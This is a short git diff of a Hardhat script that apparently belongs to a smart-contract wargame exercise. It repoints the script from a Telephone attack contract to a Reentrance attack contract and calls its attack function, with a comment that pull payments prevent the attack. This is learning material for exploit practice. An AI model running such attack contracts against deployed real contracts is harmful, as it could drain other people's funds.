@@ -3,15 +3,15 @@ import { ethers } from 'hardhat';
 import hre from 'hardhat';
 
 async function main() {
-  const contractAddress = '0xCf99D16A232A9Fa700760Ba74daFD7646DAd4353';
+  const contractAddress = '0x0251A386074f32F9C6b850F980164C237E85F7ab';
   const contract = await hre.ethers.getContractAt(
-    'TelephoneAttack',
+    'ReentranceAttack',
     contractAddress
   );
 
-  // Call attack function
-  const attack = await contract.attack({ gasLimit: 5_000_000 });
+  const attack = await contract.attack({ gasLimit: 1_000_000 });
   await attack.wait();
+  // Can prevent with pull payment. 
 }
 
 // We recommend this pattern to be able to use async/await everywhere
